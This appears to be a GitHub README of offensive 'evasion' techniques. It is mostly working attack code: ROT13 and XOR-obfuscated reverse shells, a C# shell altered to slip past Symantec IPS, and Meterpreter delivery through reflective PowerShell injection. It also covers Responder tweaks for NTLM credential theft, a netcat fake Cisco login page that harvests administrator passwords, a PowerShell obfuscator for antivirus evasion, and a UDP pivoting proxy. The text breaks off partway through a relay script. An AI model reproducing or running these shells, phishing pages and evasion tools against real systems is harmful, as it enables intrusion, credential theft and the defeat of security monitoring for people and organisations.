# evasion
Techniques for evading firewalls and malware detection.

Acronyms used:
* UTM - Unified Threat Management.  A class of nextgen firewalls with integrated security features.
* IDS - Intrusion Detection System.  A device that detects malicious network traffic.
* IPS - Intrusion Prevention System.  A device that detects and blocks malicious network traffic.
* A/V - Anti-Virus, Anti-Malware, etc.

## >> ROT13 encoded reverse shell using bash TCP device

This technique is useful for getting a Linux reverse shell through a UTM firewall, IDS or IPS.

In this example the attacking host is on IP address 10.1.2.3 and listens on port 4444 for the reverse shell from the victim.

( attacker )<br />

[ linux command ]<br />
`IFS=''; (while read -r lin; do echo $lin | tr 'A-Za-z' 'N-ZA-Mn-za-m'; done) | nc -nlvp 4444 | tr 'A-Za-z' 'N-ZA-Mn-za-m'`<br />

( victim )<br />

[ linux command ]<br />
`exec 5<>/dev/tcp/10.1.2.3/4444; /bin/bash 2>&1 <(while read -r lin; do echo $(echo $lin | stdbuf -i0 -o0 -e0 tr 'A-Za-z' 'N-ZA-Mn-za-m'); done <&5) | stdbuf -i0 -o0 -e0 tr 'A-Za-z' 'N-ZA-Mn-za-m' >&5; exec 5<&-`<br />

## >> XOR obfuscated reverse shell using python

This technique is useful for getting a reverse shell through a UTM firewall, IDS or IPS on a system supporting Python.

In this example the attacking host is on IP address 10.1.2.3 and listens on port 4444 for the reverse shell from the victim.

( attacker )<br />

[ python script ]<br />
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 4444))
s.listen(2)
print "Listening... "
(client, (ip, port)) = s.accept()
print " Received connection from : ", ip
while True:
  command = raw_input('~$ ')
  encode = bytearray(command)
  for i in range(len(encode)):
    encode[i] ^=0x5A
  client.send(encode)
  en_data=client.recv(2048)
  decode = bytearray(en_data)
  for i in range(len(decode)):
    decode[i] ^=0x5A
  print decode
client.close()
s.close()
```

( victim )<br />

[ python script ]<br />
```python
import socket,subprocess,sys
RHOST = "10.1.2.3"
RPORT = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
while True:
  data = s.recv(1024)
  en_data = bytearray(data)
  for i in range(len(en_data)):
    en_data[i] ^=0x5A
  comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  STDOUT, STDERR = comm.communicate()
  en_STDOUT = bytearray(STDOUT)
  for i in range(len(en_STDOUT)):
    en_STDOUT[i] ^=0x5A
  s.send(en_STDOUT)
s.close()
```

## >> Circumventing A/V on Windows to get meterpreter reverse shell

This technique is useful for getting a reverse shell on Windows where endpoint A/V protection is in place that blocks malicious DLLs and blocks malicious network connections such as the default meterpreter reverse_https SSL server certificate.

In this example the attacking host is Kali on IP address 10.1.2.3 and listens on port 443 for the reverse shell from the victim.  Powershell reflection will be used on the Windows victim to execute the meterpreter DLL.  The receiving Kali host will use metasploit multi-handler with a custom SSL certificate to accept the reverse HTTPS connection.

( attacker )<br />

First create your custom SSL certificate and private key.  The properties (e.g. Subject) used by the default certificate for reverse_https in metasploit that are sent during the SERVER HELLO phase may trigger host-based IDS/IPS so you will need to replace it with a certificate that has different Subject attributes.  Execute the following two commands to generate a replacement certificate.  This example assumes the output file msf.pem will be place into root's home folder.

`openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -subj "/C=US/ST=NY/L=Ithaca/O=Insanity/CN=pwned.you.org" -keyout msf.key -out msf.crt`<br />
`cat msf.key msf.crt > msf.pem`<br />

Generate the meterpreter DLL as a base64 blob that you will paste into the powershell script which will be executed on the Windows victim.

[ 32-bit meterpreter payload ]<br />
`msfvenom -a x86 -p windows/meterpreter/reverse_https LHOST=10.1.2.3 LPORT=443 -f dll | base64 -w 0`<br />
[ 64-bit meterpreter payload ]<br />
`msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=10.1.2.3 LPORT=443 -f dll | base64 -w 0`<br />

Create a powershell script called msf.ps1 that will be executed on the victim.  The powershell script will incorporate code developed by PowerShell Mafia to handle the reflective DLL injection.  The URL for the reflection code is here:

https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

The msf.ps1 script should be constructed as follows:

`$b64_meterpreter_dll = '<paste base64 for DLL here>'`<br />
`$bytes = [Convert]::FromBase64String($b64_meterpreter_dll)`<br />
`<paste PowerShell Mafia code here>`<br />
`Invoke-ReflectivePEInjection -PEBytes $bytes -Verbose`<br />

Launch metasploit and start the multi-handler listener to receive the meterpreter reverse HTTPS payload.  Be sure to use the appropriate architecture (x86 or x64):

`msfconsole -q`<br />
`use exploit/multi/handler`<br />
`set payload windows/x64/meterpreter/reverse_https`<br />
`set lhost 10.1.2.3`<br />
`set lport 443`<br />
`set HandlerSSLCert /root/msf.pem`<br />
`set StagerVerifySSLCert false`<br />
`run`<br />

( victim )<br />

Deliver the msf.ps1 script to the Windows victim and execute it.

## >> Modifying Responder.py to evade AV detection

If Windows AV (e.g. Symantec Endpoint Protection - SEP) is interfering with HTTP NTLM credential grabbing attacks using `Responder.py`, try this.  Tested with Responder version 3.0.2.0.

**Clone and edit Responder**

```
mkdir ~/scripts
cd ~/scripts
git clone https://github.com/lgandx/Responder
cd Responder
```

Edit `Responder.conf` to serve a 1x1 pixel png file.

```
under "; Servers to start"
    set all to Off except HTTP
under "; Specific NBT-NS/LLMNR names to respond to"
    set RespondToName = DONOTRESPOND
under "; HTML answer to inject in HTTP responses"
    set HTMLToInject = <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAABhGlDQ1BJQ0MgcHJvZmlsZQAAKJF9kT1Iw0AYht+mloq0ONhBxCFDdbIgKuKoVShChVArtOpgcukfNGlIUlwcBdeCgz+LVQcXZ10dXAVB8AfEydFJ0UVK/C4ptIjxjuMe3vvel7vvAKFZZZrVMw5oum1mUkkxl18Vw6+I0AwhiqjMLGNOktLwHV/3CPD9LsGz/Ov+HFG1YDEgIBLPMsO0iTeIpzdtg/M+cYyVZZX4nHjMpAsSP3Jd8fiNc8llgWfGzGxmnjhGLJa6WOliVjY14iniuKrplC/kPFY5b3HWqnXWvid/YaSgryxzndYwUljEEiSIUFBHBVXYSNCuk2IhQ+dJH/+Q65fIpZCrAkaOBdSgQXb94H/wu7dWcXLCS4okgdCL43yMAOFdoNVwnO9jx2mdAMFn4Erv+GtNYOaT9EZHix8B/dvAxXVHU/aAyx1g8MmQTdmVgrSEYhF4P6NvygMDt0Dfmte39jlOH4As9Sp9AxwcAqMlyl73eXdvd9/+rWn37wfzwXJ0GXT1kgAAAAlwSFlzAAAuIwAALiMBeKU/dgAAAAxJREFUCNdjOHbsGAAEqAJTHAqdsQAAAABJRU5ErkJggg==">
```

Edit `packets.py` and change every instance of `Microsoft-IIS/7.5` to `Apache/2.2.15`.<br />
If using `vi` search and replace `:%s/Microsoft-IIS\/7.5/Apache\/2.2.15/g`

Clear the cache and logs<br />
```
rm Responder.db
rm logs/*
```

Launch Responder.<br />
`python2 ./Responder.py -I wlan0`

Lure the victim to request the URL, where www.my.lab is the attacking host running Responder.<br />
(e.g.) `http://www.my.lab/images/image.png`

## >> Capturing Credentials with Fake Login Pages

This example shows how to setup a lightweight web server using bash and netcat to phish a user name and password from a network administrator.  In this example a fake login page is served to a user; once the credentials are captured the user is redirected to a real device.  This technique can be modified to suit a variety of scenarios.  

**Create a directory for the script and files**

```
mkdir -p /root/scripts/web_creds
cd /root/scripts/web_creds
```

**Create the HTML for the fake login page**

The page used in this example can be found [here](https://github.com/billchaison/evasion/blob/master/cisco.html.zip)<br />
The uncompressed file will be saved to `/root/scripts/web_creds/cisco.html` in this example.

**Create the web server script**

The script will be `/root/scripts/web_creds/web_creds.sh`

```bash
#!/usr/bin/bash

# harvest credentials using a fake login page followed by
# redirect to legitimate site.  for example, lure a victim
# to log onto a fake router admin page then redirect to a
# real device.

# minimal web server using bash and netcat.
# change variables to suit your environment.

# the adapter IP address nc will bind to
NC_BIND_ADDR=192.168.1.242
# the TCP port nc will listen on
NC_BIND_PORT=80
# the resource path the victim will be lured to
RESOURCE_GET=/admin/logon
# the 302 redirect to a real device login page
REDIRECT_URL=http://192.168.1.1/Main_Login.asp
# the GET form action used in WEBCRED_FILE when credentials are supplied
# (using GET instead of POST because of absence of line buffered POST data)
WEBCRED_GET=/session/logon_51aa0e6a
# local HTML file containing fake authentication portal
WEBCRED_FILE=/root/scripts/web_creds/cisco.html

MY_HOST_FQDN=$(hostname -f)
WEBCRED_SIZE=$(stat -c %s $WEBCRED_FILE | tr -d [\r\n])

echo -e "Lure victim to:\nhttp://$NC_BIND_ADDR:$NC_BIND_PORT$RESOURCE_GET\nhttp://$MY_HOST_FQDN:$NC_BIND_PORT$RESOURCE_GET\n"

function urldecode {
   echo $@ | sed "s@+@ @g;s@%@\\\\x@g" | xargs -0 printf "%b"
}

while true
do
   mkfifo webcreds_wr >/dev/null 2>&1
   mkfifo webcreds_rd >/dev/null 2>&1
   FLAG=0
   nc -nl -s $NC_BIND_ADDR -p $NC_BIND_PORT >webcreds_rd < <(cat webcreds_wr) 2>/dev/null &
   NCPID=$!
   while read line <webcreds_rd
   do
      if [ $FLAG -eq 0 ]
      then
         FLAG=1
         (sleep 5; if [ -d "/proc/$NCPID" ]; then kill $NCPID; rm -f webcreds_rd; mkfifo webcreds_rd >/dev/null 2>&1; fi)&
      fi
      if echo "$line" | grep $RESOURCE_GET | grep -vi Referer >/dev/null 2>&1
      then
         HTTP_RESP_1="HTTP/1.1 200 OK"
         HTTP_RESP_2="Server: Apache/2.4"
         HTTP_RESP_3="Date: $(date -u | sed 's/AM \|PM //' | sed 's/UTC/GMT/' | sed 's/ /, /')"
         HTTP_RESP_4="Content-Length: $WEBCRED_SIZE"
         HTTP_RESP_5="Connection: close"
         HTTP_RESP_6="Content-Type: text/html"
         HTTP_RESP_7=$(cat $WEBCRED_FILE)
         printf "%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n%s\r\n\r\n%s" "$HTTP_RESP_1" "$HTTP_RESP_2" "$HTTP_RESP_3" "$HTTP_RESP_4" "$HTTP_RESP_5" "$HTTP_RESP_6" "$HTTP_RESP_7" >webcreds_wr
         sleep 1
         kill $NCPID >/dev/null 2>&1
         break
      fi
      if echo "$line" | grep $WEBCRED_GET >/dev/null 2>&1
      then
         date
         echo $line
         echo -n "[decoded] "
         urldecode "$line"
         echo ============================================================
         HTTP_RESP_1="HTTP/1.1 302 Found"
         HTTP_RESP_2="Location: $REDIRECT_URL"
         printf "%s\r\n%s\r\n\r\n" "$HTTP_RESP_1" "$HTTP_RESP_2" > webcreds_wr
         sleep 1
         kill $NCPID >/dev/null 2>&1
         break
      fi
   done
done
```

**Launching the attack**

Run the script `./web_creds.sh` you will see the following output.<br />
![alt text](https://github.com/billchaison/evasion/blob/master/wc01.png)

Once the user accesses `http://192.168.1.242:80/admin/logon` the following page will be returned.<br />
![alt text](https://github.com/billchaison/evasion/blob/master/wc02.png)

The user provides credentials into the form fields then clicks on the Login button.<br />
![alt text](https://github.com/billchaison/evasion/blob/master/wc03.png)

The user is redirected to a real device's login page.<br />
![alt text](https://github.com/billchaison/evasion/blob/master/wc04.png)

The script prints the captured credentials then waits for other login attempts.<br />
![alt text](https://github.com/billchaison/evasion/blob/master/wc05.png)

## >> Obfuscating PowerShell Scripts

This script (psob.ps1) utilizes PowerShell's Abstract Syntax Tree (AST) parser to produce obfuscated scripts to attempt evasion of anti-virus software.  The script reads a source file and removes single line comments, obfuscates parameters, variables, function names and string constants.  It is experimental and may need tweaks, test your output script prior to using it and make manual adjustments as needed.

Usage: `powershell.exe psob.ps1 c:\files\in.ps1 c:\files\out.ps1`

```powershell
if(!($args.Count -eq 2))
{
   Write-Output "You must provide the <input file> and <output file> as arguments."
   Write-Output "(e.g.) powershell.exe psob.ps1 c:\files\in.ps1 c:\files\out.ps1"
   return
}

$InFile = $args[0]
$OutFile = $args[1]

Function RandomStr
{
   Param(
   [Parameter(Position = 0, Mandatory = $true)]
   [String]$Length
   )

   return -join (((0x61..0x7a) * 10) | Get-Random -Count $Length | % {[char]$_})
}

Function Base64Encode
{
   Param(
   [Parameter(Position = 0, Mandatory = $true)]
   [String]$Text
   )

   $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
   return [Convert]::ToBase64String($Bytes)
}

Write-Output "[+] Syntax checking $InFile"
try
{
   $contents = Get-Content -Path $InFile -ErrorAction Stop
   $Errors = $null
   $null = [System.Management.Automation.PSParser]::Tokenize($contents, [ref]$Errors)
   if($Errors.Count -gt 0) { throw }
   Write-Output "[+] Source file syntax check passed."
}
catch
{
   Write-Output "[-] Source file syntax check failed."
   Break
}

Write-Output "[+] Parsing the source file."
$AST = [System.Management.Automation.Language.Parser]::ParseFile($InFile, [ref]$null, [ref]$null)

Write-Output "[+] Gathering function names."
$Funcs = @{}
$AST.FindAll({$args[0] -is [System.Management.Automation.Language.FunctionDefinitionAst]}, $true) | Foreach { if($_.Name -ne "main") { if($Funcs.ContainsKey($_.Extent.StartLineNumber)) { $null = $Funcs[$_.Extent.StartLineNumber].Add($_.Name); $null = $Funcs[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) } else { $Funcs[$_.Extent.StartLineNumber] = New-Object -TypeName "System.Collections.ArrayList"; $null = $Funcs[$_.Extent.StartLineNumber].Add($_.Name); $null = $Funcs[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) }}}

Write-Output "[+] Generating function map."
$FuncMap = @{}
$FuncMapCollisions = @{}
Foreach($Key in $Funcs.Keys)
{
   $Arr = $Funcs.$Key
   for($i = 0; $i -lt $Arr.Count; $i += 2)
   {
      for($j = 0; $j -lt 5; $j++)
      {
         $newfunc = RandomStr $Arr[$i].Length
         if(!$FuncMapCollisions.ContainsKey($newfunc))
         {
            $FuncMapCollisions[$newfunc] = ""
            $FuncMap[$Arr[$i]] = $newfunc
            break
         }
      }
      if($j -eq 5)
      {
         Write-Output "[-] Function map collision error."
         return
      }
   }
}

Write-Output "[+] Gathering function use."
$Cmds = @{}
$AST.FindAll({$args[0] -is [System.Management.Automation.Language.CommandAst]}, $true) | Foreach { if($Cmds.ContainsKey($_.Extent.StartLineNumber)) { $null = $Cmds[$_.Extent.StartLineNumber].Add($_.GetCommandName()); $null = $Cmds[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) } else { $Cmds[$_.Extent.StartLineNumber] = New-Object -TypeName "System.Collections.ArrayList"; $null = $Cmds[$_.Extent.StartLineNumber].Add($_.GetCommandName()); $null = $Cmds[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) }}

Write-Output "[+] Gathering variable names."
$AutoVars = @('$$', '$?', '$^', '$_', '$allnodes', '$args', '$consolefilename', '$error', '$event', '$eventargs', '$eventsubscriber', '$executioncontext', '$false', '$foreach', '$home', '$host', '$input', '$lastexitcode', '$myinvocation', '$nestedpromptlevel', '$null', '$ofs', '$pid', '$profile', '$psboundparameters', '$pscmdlet', '$pscommandpath', '$psculture', '$psdebugcontext', '$pshome', '$psitem', '$psscriptroot', '$pssenderinfo', '$psuiculture', '$psversiontable', '$pwd', '$sender', '$shellid', '$sourceargs', '$sourceeventargs', '$stacktrace', '$this', '$true')
$Vars = @{}
$AST.FindAll({$args[0] -is [System.Management.Automation.Language.VariableExpressionAst]}, $true) | foreach { if(!($AutoVars -contains $_.Extent.Text)) { if($Vars.ContainsKey($_.Extent.StartLineNumber)) { $null = $Vars[$_.Extent.StartLineNumber].Add($_.Extent.Text); $null = $Vars[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) } else { $Vars[$_.Extent.StartLineNumber] = New-Object -TypeName "System.Collections.ArrayList"; $null = $Vars[$_.Extent.StartLineNumber].Add($_.Extent.Text); $null = $Vars[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) }}}

Write-Output "[+] Generating parameter exclusions."
$VarSkip = New-Object -TypeName "System.Collections.ArrayList"
$AST.FindAll({$args[0].GetType().Name -like "ParamBlockAst"}, $true) | foreach { $null = $VarSkip.Add(-join($_.Extent.StartLineNumber, ":", $_.Extent.EndLineNumber)) }

Function ProtectedVar
{
   Param(
   [Parameter(Position = 0, Mandatory = $true)]
   [Int32]$num
   )

   Foreach($i in $VarSkip)
   {
      $j = $i -split ":"
      if($num -ge $j[0] -and $num -le $j[1]) { return $true }
   }
   return $false
}

$VarSkipMap = @{}
$ParamMap = @{}
$VarMapCollisions = @{}
Foreach($Key in $Vars.Keys)
{
   if(ProtectedVar $Key)
   {
      $Arr = $Vars.$Key
      for($i = 0; $i -lt $Arr.Count; $i += 2)
      {
         $p = -join('-', $Arr[$i].SubString(1))
         for($j = 0; $j -lt 5; $j++)
         {
            $x = (RandomStr ($Arr[$i].Length - 1))
            $newvar = -join('$', $x)
            $newparam = -join('-', $x)
            if(!$VarMapCollisions.ContainsKey($newvar))
            {
               $VarMapCollisions[$newvar] = ""
               $VarSkipMap[$Arr[$i]] = $newvar
               $ParamMap[$p] = $newparam
               break
            }
         }
         if($j -eq 5)
         {
            Write-Output "[-] Variable parameter map collision error."
            return
         }
      }
   }
}

Write-Output "[+] Gathering function parameter use."
$CmdParams = @{}
$AST.FindAll({$args[0].GetType().Name -like "CommandParameterAst"}, $true) | foreach { if($ParamMap.Keys -contains $_.Extent.Text) { if($CmdParams.ContainsKey($_.Extent.StartLineNumber)) { $null = $CmdParams[$_.Extent.StartLineNumber].Add($_.Extent.Text); $null = $CmdParams[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) } else { $CmdParams[$_.Extent.StartLineNumber] = New-Object -TypeName "System.Collections.ArrayList"; $null = $CmdParams[$_.Extent.StartLineNumber].Add($_.Extent.Text); $null = $CmdParams[$_.Extent.StartLineNumber].Add(-join($_.Extent.StartColumnNumber, ":", $_.Extent.EndColumnNumber)) }}}

Write-Output "[+] Generating variable map."
$VarMap = @{}
$VarToMap = $Vars.values | Foreach { $_ | Select-String -pattern "^\$" } | Select -Unique | Foreach { $a = $_.ToString(); if(!$VarSkipMap.ContainsKey($a)) { $a } }
Foreach($v in $VarToMap)
{
   for($i = 0; $i -lt 5; $i++)
   {
      $newvar = -join('$', (RandomStr ($v.Length - 1)))
      if(!$VarMapCollisions.ContainsKey($newvar))
      {
         $VarMapCollisions[$newvar] = ""
         $VarMap[$v] = $newvar
         break
      }
   }
   if($i -eq 5)
   {
      Write-Output "[-] Variable map collision error."
      return
   }
}

Write-Output "[+] Generating string to base64 map."
$Strs = @{}
$StrToB64 = @{}
$AST.FindAll({$args[0].GetType().Name -like "StringConstantExpressionAst"}, $true) | foreach { if(($_.StringConstantType -ceq "DoubleQuoted" -or $_.StringConstantType -ceq "SingleQuoted") -and ($_.Extent.Text -ne '""' -and $_.Extent.Text -ne "''" -and $_.Extent.Text.Length -gt 3)) { if($Strs.ContainsKey($_.Extent.StartLineNumber)) { $null = $Strs[$_.Extent.StartLineNumber].Add($_.Extent.Text) } else { $Strs[$_.Extent.StartLineNumber] = New-Object -TypeName "System.Collections.ArrayList"; $null = $Strs[$_.Extent.StartLineNumber].Add($_.Extent.Text) }}}
$SwitchStrs = $AST.FindAll({$args[0].GetType().Name -like "SwitchStatementAst"}, $true) | foreach { $_.Clauses.Item1.Extent } | foreach { $_.StartLineNumber }
Foreach($Key in $Strs.Keys)
{
   if(!(ProtectedVar $Key) -and !($SwitchStrs -Contains $Key))
   {
      $StrToB64[$Key] = New-Object -TypeName "System.Collections.ArrayList"
      Foreach($i in $Strs[$Key])
      {
         $null = $StrToB64[$Key].Add($i)
         $j = $i.Substring(1, $i.Length - 2)
         $k = Base64Encode $j
         $m = -join('([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("', $k, '")))')
         $null = $StrToB64[$Key].Add($m)
      }
   }
}

Write-Output "[+] Generating the output file."
$PSObfuscated = New-Object -TypeName "System.Collections.ArrayList"
$num = 1
Foreach($line in Get-Content $InFile)
{
   $temp = $line
   if(!($temp -match "^[`t ]*#"))
   {
      if($Cmds.ContainsKey($num))
      {
         $Arr = $Cmds[$num]
         for($i = 0; $i -lt $Arr.Count; $i += 2)
         {
            if($FuncMap.ContainsKey($Arr[$i]))
            {
               $j = ($Arr[$i + 1]).Split(":")
               $temp = $temp.remove(($j[0] - 1), $Arr[$i].Length).insert(($j[0] - 1), $FuncMap[$Arr[$i]])
            }
         }
      }
      if($Vars.ContainsKey($num))
      {
         $Arr = $Vars[$num]
         for($i = 0; $i -lt $Arr.Count; $i += 2)
         {
            if($VarMap.ContainsKey($Arr[$i]))
            {
               $j = ($Arr[$i + 1]).Split(":")
               $temp = $temp.remove(($j[0] - 1), $Arr[$i].Length).insert(($j[0] - 1), $VarMap[$Arr[$i]])
            }
         }
      }
      if($Funcs.ContainsKey($num))
      {
         $i = 0;
         $Arr = $Funcs[$num] | foreach { if(!($i++ % 2)) { $_ }} | sort length -desc
         Foreach($j in $Arr)
         {
            $temp = $temp -replace $j, $FuncMap[$j]
         }
      }
      if(ProtectedVar $num)
      {
         if($Vars.ContainsKey($num))
         {
            $Arr = $Vars[$num]
            for($i = 0; $i -lt $Arr.Count; $i += 2)
            {
               $k = $Arr[$i]
               $j = ($Arr[$i + 1]).Split(":")
               if($VarSkipMap.ContainsKey($k))
               {
                  $temp = $temp.remove(($j[0] - 1), $k.Length).insert(($j[0] - 1), $VarSkipMap[$k])
               }
            }
         }
      }
      else
      {
         if($Vars.ContainsKey($num))
         {
            $Arr = $Vars[$num]
            for($i = 0; $i -lt $Arr.Count; $i += 2)
            {
               $k = $Arr[$i]
               $j = ($Arr[$i + 1]).Split(":")
               if($VarSkipMap.ContainsKey($k))
               {
                  $temp = $temp.remove(($j[0] - 1), $k.Length).insert(($j[0] - 1), $VarSkipMap[$k])
               }
            }
         }
      }
      if($CmdParams.ContainsKey($num))
      {
         $Arr = $CmdParams[$num]
         for($i = 0; $i -lt $Arr.Count; $i += 2)
         {
            if($ParamMap.ContainsKey($Arr[$i]))
            {
               $k = $Arr[$i]
               $j = ($Arr[$i + 1]).Split(":")
               if(($FuncMap.Values | %{$temp.contains($_)}) -contains $true)
               {
                  $temp = $temp.remove(($j[0] - 1), $k.Length).insert(($j[0] - 1), $ParamMap[$k])
               }
            }
         }
      }
      if($StrToB64.ContainsKey($num))
      {
         $Arr = $StrToB64[$num]
         for($i = 0; $i -lt $Arr.Count; $i += 2)
         {
            #$temp = $temp -Replace $Arr[$i], $Arr[$i + 1]
            $temp = $temp.Replace($Arr[$i], $Arr[$i + 1])
         }
      }
      $null = $PSObfuscated.Add($temp)
   }
   $num++
}
try
{
   $PSObfuscated | Out-File -FilePath $OutFile -ErrorAction Stop
   Write-Output "[+] Output file created successfully, $OutFile."
   Write-Output "    Manual edits might be needed:"
   Write-Output "    > Change 'DefaultParameterSetName' and 'ParameterSetName' strings."
   Write-Output "    > Remove multi-line comment blocks."
}
catch
{
   Write-Output "[-] Failed to create output file."
}
```

## >> C# Reverse Shell

This example modifies already-published reverse shell code written in C# to slip past IDS/IPS.  The source script was taken from:

`https://github.com/carlospolop/hacktricks/blob/master/windows/av-bypass.md#compiling-our-own-reverse-shell`

The following modifications were made:<br />
1. Suppress banner to evade AV network detection (e.g. SEP Firewall IPS)
2. Added kill command to close the reverse shell

The example source file is called `rs.cs`, compile like this `csc.exe /out:rs.exe rs.cs`

Start a netcat listener on the receiver, for example `nc -nlvp 4444` then execute on the target `rs.exe 192.168.1.242 4444`

This is the modified code, `rs.cs`<br />
```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
namespace ConnectBack
{
   public class Program
   {
      static StreamWriter streamWriter;
      public static void Main(string[] args)
      {
         using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
         {
            using(Stream stream = client.GetStream())
            {
               using(StreamReader rdr = new StreamReader(stream))
               {
                  streamWriter = new StreamWriter(stream);
                  StringBuilder strInput = new StringBuilder();
                  Process p = new Process();
                  p.StartInfo.FileName = "cmd.exe";
                  p.StartInfo.CreateNoWindow = true;
                  p.StartInfo.UseShellExecute = false;
                  p.StartInfo.RedirectStandardOutput = true;
                  p.StartInfo.RedirectStandardInput = true;
                  p.StartInfo.RedirectStandardError = true;
                  p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                  p.Start();
                  p.BeginOutputReadLine();
                  while(true)
                  {
                     strInput.Append(rdr.ReadLine());
                     //strInput.Append("\n");
                     // Added kill command to close the reverse shell
                     if(strInput.ToString().Contains("KILLME"))
                     {
                        System.Environment.Exit(0);
                     }
                     p.StandardInput.WriteLine(strInput);
                     strInput.Remove(0, strInput.Length);
                  }
               }
            }
         }
      }
      private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
      {
         StringBuilder strOutput = new StringBuilder();
         if (!String.IsNullOrEmpty(outLine.Data))
         {
            // Suppress banner to evade AV network detection (e.g. SEP Firewall IPS)
            if(!outLine.Data.Contains("Microsoft Windows [Version") && !outLine.Data.Contains("Microsoft Corporation. All rights reserved"))
            {
               try
               {
                  strOutput.Append(outLine.Data);
                  streamWriter.WriteLine(strOutput);
                  streamWriter.Flush();
               }
               catch (Exception err) { }
            }
         }
      }
   }
}
```

Without the modifications, AV will block the connection.<br />
![alt text](https://github.com/billchaison/evasion/blob/master/rs00.png)

Your reverse shell will not complete.<br />
![alt text](https://github.com/billchaison/evasion/blob/master/rs01.png)

With the modifications, your reverse shell will slip past IDS/IPS.<br />
![alt text](https://github.com/billchaison/evasion/blob/master/rs02.png)

## >> PowerShell UDP Proxy

This technique gives an example of tunneling UDP through a TCP session on a Windows host.  There are several components:<br />
1. A TCP to UDP proxy running on Windows as a Powershell script.
2. A Linux attack host that is attempting an snmpwalk against an IOT target.
3. A Linux attack host that is relaying the SNMP traffic between Windows and the other attack host.

The scenario shown here demonstrates how Linux attack hosts that do not have direct access to the IOT target can pivot through a Windows host that does have access to the IOT device.  The scenario is pictured below.  The "Linux 1" host will be set up first, then the Powershell script will be executed on the "Windows" host, which will make a TCP connection back through the firewall to "Linux 1" on port 4444.  Finally the "Linux 2" host will be configured to route traffic to the IOT device's IP address through "Linux 1" and execute an snmpwalk.  This technique has also been tested successfully on other protocols such as DNS.

![alt text](https://github.com/billchaison/evasion/blob/master/udp00.png)

**Set up "Linux 1"**

Create 3 scripts on this host.  The script `udpraw.py` uses scapy to craft raw UDP responses that are sent back to the "Linux 2" host.  The script `responder.sh` uses socat to receive UDP requests sent from the "Linux 2" host and extract the data.  The script `relay.py` is the send/receive bridge between "Linux 1" and the "Windows" host.

Configure routing and iptables NAT rule.<br />
```
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING  -p udp -i eth0 -d 10.180.151.13 -j DNAT --to-destination 192.168.1.242
```

Create the `udpraw.py` script.<br />
```python
#!/usr/bin/python3
import sys, getopt
from scapy.all import *
nargs = len(sys.argv) - 1
if nargs != 6:
    print("supply <interface> <source IP> <source port> <dest IP> <dest port> <data file>")
    exit(1)
intfc = sys.argv[1]
srcip = sys.argv[2]
srcpo = sys.argv[3]
dstip = sys.argv[4]
dstpo = sys.argv[5]
dfile = sys.argv[6]
with open(dfile, mode='rb') as file:
    data = file.read()
    file.close()
packet = IP(src = srcip, dst = dstip) / UDP(sport = int(srcpo), dport = int(dstpo)) / Raw(load = data)
send(packet, iface = intfc)
exit(0)
```

Create and execute the `responder.sh` script in one terminal.<br />
```bash
#!/usr/bin/bash
target_host="10.180.151.13"
target_port="161"
iface="eth0"
count=0
rm /tmp/relay.snd 2>/dev/null
rm /tmp/relay.rcv 2>/dev/null
mkfifo /tmp/relay.snd 2>/dev/null
mkfifo /tmp/relay.rcv 2>/dev/null
rm /tmp/snmp.log 2>/dev/null
while true
do
   data=$(socat -dd - UDP4-RECVFROM:$target_port 2>/tmp/snmp.log | base64 -w 0)
   peer=$(cat /tmp/snmp.log | grep "receiving packet from")
   if [ $? -eq 0 ]
   then
      peer=$(echo $peer | rev | cut -d " " -f 1 | rev)
      peer_addr=$(echo $peer | cut -d ":" -f 1)
      peer_port=$(echo $peer | cut -d ":" -f 2)
      packet="$target_host:$target_port:$data"
      echo $packet >/tmp/relay.snd
      read -r recv </tmp/relay.rcv
      echo $recv | base64 -d >/tmp/udp_resp
      resplen=$(stat -c '%s' /tmp/udp_resp)
      echo "$count, Sending $resplen byte response to $peer_addr"
      count=$(($count + 1))
      /root/udpraw.py $iface $target_host $target_port $peer_addr $peer_port /tmp/udp_resp >/dev/null
      sleep 0.1
   else
      echo "Log parse error"
   fi
done
```

Create and execute the `relay.py` script in another terminal.<br />
```python
#!/usr/bin/python3
import socket
import sys
from time import sleep
host = '0.0.0.0'
port = 4444
count = 0
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
   s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   s.bind((host, port))
   s.listen()
   conn, addr = s.accept()
   with conn:
      print('Connection from', addr)
      while True:
         with open('/tmp/relay.snd', "r") as sfifo:
            while True:
               sdata = sfifo.read()
               if len(sdata) != 0:
                  print(str(count) + ", Relaying " + str(len(sdata)) + " bytes")
                  count = count + 1
                  conn.sendall(sdata.encode())
                  rdata = conn.recv(2048)
                  if not rdata:
                     break
                  resp = rdata.decode("utf-8")
               try:
